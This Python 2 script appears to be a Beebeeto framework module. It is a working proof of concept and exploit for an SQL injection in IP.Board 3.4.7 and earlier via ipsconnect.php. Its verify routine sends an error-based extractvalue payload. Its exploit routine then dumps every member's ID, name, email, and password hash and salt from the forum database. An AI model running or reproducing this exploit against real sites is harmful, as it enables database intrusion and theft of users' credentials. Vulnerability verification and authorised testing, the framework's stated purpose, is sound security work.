#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0142',
            'name': 'IP.Board <= 3.4.7 /ipsconnect.php SQL Injection POC & Exploit',
            'author': '我只会打连连看',
            'create_date': '2014-11-09',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'IP.Board',
            'vul_version': ['<= 3.4.7'],
            'type': 'SQL Injection',
            'tag': ['IP.Board漏洞', 'SQL注入漏洞', '/ipsconnect.php', 'php'],
            'desc': 'IP.Board version 3.4.7 (latest) suffers from a SQL injection vulnerability.',
            'references': ['http://seclists.org/fulldisclosure/2014/Nov/20',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        payload = 'act=login&idType=id&id[]=-1&id[]=-1) and 1!="\'" and extractvalue(1,concat(md5(123)))#'
        url_list = ['/interface/ipsconnect/ipsconnect.php', '/forums/interface/ipsconnect/ipsconnect.php']
        for file_path in url_list:
            verify_url = args['options']['target'] + file_path
            if args['options']['verbose']:
                print '[*] Request URL: ' + verify_url
            try:
                urllib2.urlopen(urllib2.Request(verify_url, data=payload))
            except urllib2.HTTPError, e:
                if e.code == 503:
                    if 'There appears to be an error with the database.' in e.read():
                        args['success'] = True
                        args['poc_ret']['vul_url'] = verify_url
                        args['poc_ret']['post_data'] = payload
            continue
        return args


    @classmethod
    def inject(cls, url, sql):
        try:
            urllib2.urlopen(urllib2.Request('%s/interface/ipsconnect/ipsconnect.php' % url, data="act=login&idType=id&id[]=-1&id[]=%s" % urllib.quote('-1) and 1!="\'" and extractvalue(1,concat(0x3a,(%s)))#\'' % sql)))
        except urllib2.HTTPError, e:
            if e.code == 503:
                data = urllib2.urlopen(urllib2.Request('%s/cache/sql_error_latest.cgi' % url)).read()
                txt = re.search("XPATH syntax error: ':(.*)'", data, re.MULTILINE)
                if txt is not None: 
                    return txt.group(1)
                error_ret = 'Error [3], received unexpected data:\n%s' % data
            error_ret = 'Error [1]'
        error_ret = 'Error [2]'
        return error_ret

    @classmethod
    def get(cls, url, name, table, num):
        sqli = 'SELECT %s FROM %s LIMIT %d,1' % (name, table, num)
        s = int(cls.inject(url, 'LENGTH((%s))' % sqli))
        if s < 31:
            return cls.inject(url, sqli)
        else:
            r = ''
            for i in range(1, s+1, 31):
                r += cls.inject(url, 'SUBSTRING((%s), %i, %i)' % (sqli, i, 31))
            return r

    @classmethod
    def exploit(cls, args):
        # exp mode can not be used in batch scan :(
        url = args['options']['target']
        n = cls.inject(url, 'SELECT COUNT(*) FROM members')
        if 'Error' in n:
            args['poc_ret']['error'] = n
            return args
        print '[*] Found %s users' % n
        print
        for j in range(int(n)): 
            print '[+] member_id: \t' + cls.get(url, 'member_id', 'members', j)
            print '[+] name: \t' + cls.get(url, 'name', 'members', j)
            print '[+] email: \t' + cls.get(url, 'email', 'members', j)
            print '[+] password: \t' + cls.get(url, 'CONCAT(members_pass_hash, 0x3a, members_pass_salt)', 'members', j)
            print '----------------'
        args['success'] = True
        return args


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())